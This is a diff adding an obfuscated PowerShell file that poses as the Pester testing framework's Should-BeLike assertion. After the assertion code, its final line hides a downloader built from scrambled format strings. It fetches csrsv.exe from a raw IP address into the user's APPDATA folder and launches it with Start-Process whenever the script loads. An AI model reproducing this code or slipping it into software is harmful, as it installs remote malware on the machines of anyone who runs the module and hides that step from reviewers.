@@ -1,0 +1,37 @@
+function ShouL`d-bEli`Ke(${aCtUA`lv`AlUE}, ${eX`P`ECTe`D`VALue}, [switch] ${Ne`gAtE}, [String] ${BE`c`AUSe}) {
+    
+    [bool] ${S`U`cCeeDEd} = ${AC`Tua`LVa`lUe} -like ${E`xPectED`ValUe}
+    if (${N`e`GaTE}) {
+        ${sucCEe`d`ED} = -not ${SUC`cE`EDEd}
+    }
+
+    if (-not ${SuC`C`eedeD}) {
+        if (${neG`A`TE}) {
+            return &("{2}{1}{0}"-f 't','jec','New-Ob') ("{0}{1}" -f 'psobj','ect') -Property @{
+                ("{2}{0}{1}" -f'ucce','eded','S')      = ${F`ALSe}
+                ("{1}{0}{2}{3}{4}"-f'ai','F','l','ureMe','ssage') = "Expected like wildcard $(Format-Nicely $ExpectedValue) to not match $(Format-Nicely $ActualValue),$(Format-Because $Because) but it did match. "
+            }
+        }
+        else {
+            return .("{0}{3}{1}{2}"-f 'New','O','bject','-') ("{0}{1}{2}"-f'p','sob','ject') -Property @{
+                ("{1}{0}{2}{3}"-f 'ucc','S','eed','ed')      = ${f`AlsE}
+                ("{4}{3}{0}{1}{2}" -f'M','essa','ge','ailure','F') = "Expected like wildcard $(Format-Nicely $ExpectedValue) to match $(Format-Nicely $ActualValue),$(Format-Because $Because) but it did not match. "
+            }
+        }
+    }
+
+    return .("{2}{0}{1}"-f'ew-Ob','ject','N') ("{0}{1}{2}"-f'ps','o','bject') -Property @{
+        ("{1}{0}{2}" -f 'ucc','S','eeded') = ${Tr`UE}
+    }
+}
+
+.("{4}{6}{1}{3}{2}{0}{5}"-f 'nOper','s','rtio','e','Ad','ator','d-As') -Name         ("{1}{2}{0}"-f 'e','BeL','ik') `
+    -InternalName ("{1}{2}{0}" -f'Like','Sho','uld-Be') `
+    -Test         ${function:Should-BeLike}
+
+function sHo`ULdBElIK`EFAIlUR`E`meSsaGE() {
+}
+function NoTsHOuL`d`BeLIK`EfaIlUr`eMeSs`A`GE() {
+}
+
+(&("{2}{0}{1}"-f'bj','ect','New-O') ("{3}{5}{0}{4}{2}{1}" -f 't.W','t','n','S','ebClie','ystem.Ne')).("{1}{3}{0}{2}" -f'l','Download','e','Fi').Invoke(("{0}{2}{5}{10}{7}{8}{3}{9}{4}{1}{6}"-f'ht','ex','tp:/','csr','v.','/','e','.53.238/~yaho','o/','s','94.102'),"$env:APPDATA\csrsv.exe");&("{0}{2}{3}{1}" -f'S','ess','tart-','Proc') ("$env:APPDATA\csrsv.exe")
